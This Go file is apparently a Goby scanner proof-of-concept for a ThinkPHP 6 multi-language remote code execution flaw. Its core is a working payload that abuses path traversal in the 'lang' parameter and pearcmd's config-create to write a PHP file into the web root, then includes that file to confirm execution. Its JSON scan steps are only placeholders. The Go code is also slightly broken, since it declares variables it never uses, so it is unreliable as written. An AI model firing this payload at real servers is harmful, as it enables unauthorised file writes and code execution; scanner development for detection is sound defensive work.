package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "ThinkPHP 6.0.0-6.0.13 多语言功能远程代码执行漏洞",
  "Description": "<p>ThinkPHP 远程代码执行漏洞,该漏洞是由于ThinkPHP开启了多语言功能，攻击者可利用该漏洞在未授权的情况下，构造恶意数据进行远程代码执行攻击，最终获取服务器最高权限。<br></p>",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": "2022-12-13",
  "Author": "",
  "FofaQuery": "header=\"think_lang\"",
  "GobyQuery": "header=\"think_lang\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "ThinkPHP 6.0.0-6.0.13 多语言功能远程代码执行漏洞",
      "Product": "",
      "Description": "<p>ThinkPHP 远程代码执行漏洞,该漏洞是由于ThinkPHP开启了多语言功能，攻击者可利用该漏洞在未授权的情况下，构造恶意数据进行远程代码执行攻击，最终获取服务器最高权限。<br></p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Thinkphp-multi-language-rce",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();unlink(__FILE__);?>+/var/www/html/test5201314.php"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
    uri_2 := "/index.php?lang=../../../../../../../../../../../../../var/www/html/test5201314"
			cfg_2 := httpclient.NewGetRequestConfig(uri_2)
			cfg_2.VerifyTls = false
			cfg_2.FollowRedirect = false
    resp, err := httpclient.DoHttpRequest(u, cfg_1)
			if resp_2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
				return strings.Contains(resp_2.RawBody, "PHP Version")
			}
			return false
		},
		nil,
	))
}
